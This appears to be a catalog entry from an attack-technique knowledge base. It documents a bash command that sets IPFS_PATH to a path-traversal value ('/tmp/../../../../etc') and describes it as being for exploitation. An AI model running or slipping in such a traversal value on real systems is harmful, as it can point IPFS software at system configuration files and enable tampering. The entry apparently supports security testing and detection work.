---
id: fcc17d52-b9cf-4857-a7b7-6a6ccbb340e2
name: export-direct-traversal
type: command
executor: bash
data: export IPFS_PATH="/tmp/../../../../etc"
output: No output
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:16.924Z'
platforms:
  - Linux
tags:
  - traversal
  - env-var
verified: false
validated: true
submitted: true
---

# export-direct-traversal

## Command

```bash
export IPFS_PATH="/tmp/../../../../etc"
```

## Description

Sets IPFS_PATH with direct ../ traversal to /etc for simple exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| IPFS_PATH | Variable with traversal path | Yes |

## Examples

### Basic Usage

```bash
export IPFS_PATH="/tmp/../../../../etc"
```

## Expected Output

None.

## Related

- [[commands/export-ipfs-path]]
- [[procedures/Export-Malicious-IPFS_PATH-Environment-Variable]]
